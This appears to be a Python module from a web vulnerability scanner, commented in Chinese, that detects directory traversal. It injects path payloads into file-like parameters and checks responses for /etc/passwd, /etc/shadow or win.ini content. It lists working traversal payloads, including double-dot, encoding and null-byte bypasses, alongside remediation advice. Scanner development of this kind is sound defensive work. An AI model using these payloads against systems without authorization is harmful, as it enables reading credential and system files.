# -*- coding: utf-8 -*-
"""检测器⑤：目录遍历 / 任意文件读取（零 Flask 依赖）

【判定思路】注入"穿越路径 + 目标文件"，用**目标文件的内容特征**作为证据：
    读取 /etc/passwd 成功 → 响应里出现 `root:x:0:0:` 这样的账户记录
    读取 win.ini 成功  → 响应里出现 `[fonts]` 段
    —— 只按状态码或响应长度判断会大量误报（很多站点对任何路径都返回 200 错误页）。

【优先级】优先测试参数名像"文件/路径"的注入点（file/path/page/doc/download/
    template/include…），其次才用其它参数兜底（有些系统用 id 取文件）。

【对抗变体（针对路径过滤）】
    - 双写绕过    ....//....//etc/passwd（过滤器只做一次 "../"→"" 替换时失效）
    - URL 编码    %2e%2e%2f…（过滤器按明文 ../ 匹配时失效）
    - 双重编码    %252e%252e%252f…（过滤器在"解码一次后"检查时失效）
    - 空字节截断  ../../etc/passwd%00.png（老版本 PHP 用后缀名做白名单时失效）
    编码类变体必须按"已编码形态"上线（不能再被客户端编码一次），
    否则语义会变——与 SQLi 检测器的双重编码处理一致。
"""
import re
from typing import Dict, List, Optional, Tuple

from ..core import Finding, ScanContext, register_detector
from .common import ParamTarget, discover_param_targets, snippet, strip_payload

# 参数名像"文件/路径"时优先测试（命中即只测这些）
FILE_LIKE_PARAMS = frozenset({
    "file", "filename", "filepath", "path", "file_name", "name", "doc",
    "document", "page", "download", "template", "tpl", "include", "load",
    "read", "src", "source", "url", "uri", "img", "image", "attach",
    "attachment", "resource", "view", "dir", "folder",
})

# 注入负载：(负载模板, 说明, 是否按"已编码形态"发送)
TRAVERSAL_PAYLOADS: List[Tuple[str, str, bool]] = [
    ("../../../../etc/passwd", "基本形式（Linux）", False),
    ("../../../../../../etc/passwd", "深层穿越", False),
    ("..\\..\\..\\..\\windows\\win.ini", "反斜杠形式（Windows）", False),
    ("/etc/passwd", "绝对路径", False),
    ("C:\\windows\\win.ini", "Windows 绝对路径", False),
    ("....//....//....//etc/passwd", "对抗变体：双写（绕过一次替换型过滤）", False),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     "对抗变体：URL 编码（绕过按明文匹配的过滤）", True),
    ("%252e%252e%252f%252e%252e%252fetc%252fpasswd",
     "对抗变体：双重编码（绕过仅解码一次的过滤）", True),
    ("../../../../etc/passwd%00.png",
     "对抗变体：空字节截断（绕过后缀名白名单）", False),
]

# 目标文件内容特征 → 说明（命中即证明读到了真实文件）
FILE_SIGNATURES: List[Tuple[str, str, str]] = [
    (r"root:.*?:0:0:", "/etc/passwd 账户文件", "critical"),
    (r"daemon:.*?:/usr/sbin/nologin", "/etc/passwd 账户文件", "critical"),
    (r"root:\$[0-9a-z]+\$", "/etc/shadow 口令哈希文件", "critical"),
    (r"(?im)^\[fonts\]|^\[extensions\]", "windows/win.ini 配置文件", "high"),
    (r"(?im)^\[boot loader\]", "windows/boot.ini 启动配置", "high"),
    (r"(?im)^\[global\]\s*$", "SMB 配置文件", "high"),
]

MAX_TARGETS = 4            # 最多测试的注入点数量（控制请求总量）


@register_detector("path_traversal", "目录遍历检测",
                   "任意文件读取（/etc/passwd 等特征校验，含双写/编码/空字节绕过变体）",
                   order=40)
def detect(ctx: ScanContext) -> List[Finding]:
    client = ctx.client
    targets = _pick_targets(discover_param_targets(ctx))

    findings: List[Finding] = []
    for target in targets:
        baseline = target.baseline_request(client)
        if not baseline.ok:
            continue
        finding = _test_target(client, target, baseline)
        if finding is not None:
            findings.append(finding)
    return findings


def _pick_targets(targets: List[ParamTarget]) -> List[ParamTarget]:
    """文件类参数优先；没有则用前几个参数兜底（有些系统用 id 取文件）"""
    file_like = [t for t in targets if t.param.lower() in FILE_LIKE_PARAMS]
    chosen = file_like or targets
    return chosen[:MAX_TARGETS]


def _test_target(client, target: ParamTarget, baseline) -> Optional[Finding]:
    baseline_signature, _, _ = _signature(baseline.text)

    for payload, note, pre_encoded in TRAVERSAL_PAYLOADS:
        resp = target.request(client, payload, pre_encoded=pre_encoded)
        if not resp.ok or not resp.text or resp.status_code >= 500:
            continue

        body = strip_payload(resp.text, payload)      # 抹掉回显，避免自证
        signature, matched, severity = _signature(body, exclude=baseline_signature)
        if not signature:
            continue

        return Finding(
            vuln_type="path_traversal",
            severity=severity,
            url=target.url_with(payload, pre_encoded=pre_encoded),
            param=target.param,
            payload=payload,
            evidence=snippet(body, matched),
            description=(f"参数 [{target.param}] 存在目录遍历（任意文件读取）——"
                         f"注入「{payload}」后，响应内容中出现 {signature} 的特征串"
                         f"（{note}）。攻击者可读取服务器上的任意文件"
                         f"（配置、源码、密钥、账户文件），进而提权或横向移动。"),
            fix_suggestion=(
                "① 不要用用户输入直接拼接文件路径——改用「白名单映射」"
                "（如把 id=1 映射到固定的文件，用户永远接触不到路径）；"
                "② 必须拼接时，先规范化路径（os.path.realpath）再校验"
                "其是否位于允许目录内（startswith(base_dir)）；"
                "③ 过滤 .. 与空字节只是补充手段，不能作为唯一防线"
                "（编码/双写变体极易绕过）；"
                "④ 文件服务应以独立低权限账户运行，限制可读目录范围。"),
        )
    return None


def _signature(text: str, exclude: str = "") -> Tuple[str, str, str]:
    """寻找目标文件的内容特征 → (文件说明, 命中的原文, 级别)；排除基线已有特征"""
    for pattern, name, severity in FILE_SIGNATURES:
        m = re.search(pattern, text or "")
        if m and name != exclude:
            return name, m.group(0), severity
    return "", "", "high"
